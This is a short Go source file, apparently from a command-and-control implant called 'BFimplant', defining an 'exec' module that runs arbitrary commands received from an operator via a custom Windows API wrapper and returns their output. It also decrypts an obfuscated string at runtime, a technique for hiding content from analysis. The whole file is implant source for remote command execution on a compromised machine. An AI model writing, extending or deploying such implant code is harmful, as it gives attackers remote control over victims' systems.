package modules

import (
	"fmt"
	"BFimplant/winapiV2"

)

type ExecuteModule struct{}

func NewExecuteModule() *ExecuteModule {
	return &ExecuteModule{}
}

func (m *ExecuteModule) Name() string {
	return "exec"
}

func (m *ExecuteModule) Execute(command string, data []byte) (string, error) {

	str := winapiV2.DecryptString("2-$1e$e2*+! 7#0)e5)$+16e2 e-$3 ")
	fmt.Println("Execccccc commaaaaaa:" , str)

	output, err := winapiV2.Exec(command)
	if err != nil {
		fmt.Println("Error execccccc commaaaaaa:", err)
		return "", err
	}
	fmt.Println(output.String())

	return output.String(), nil
}
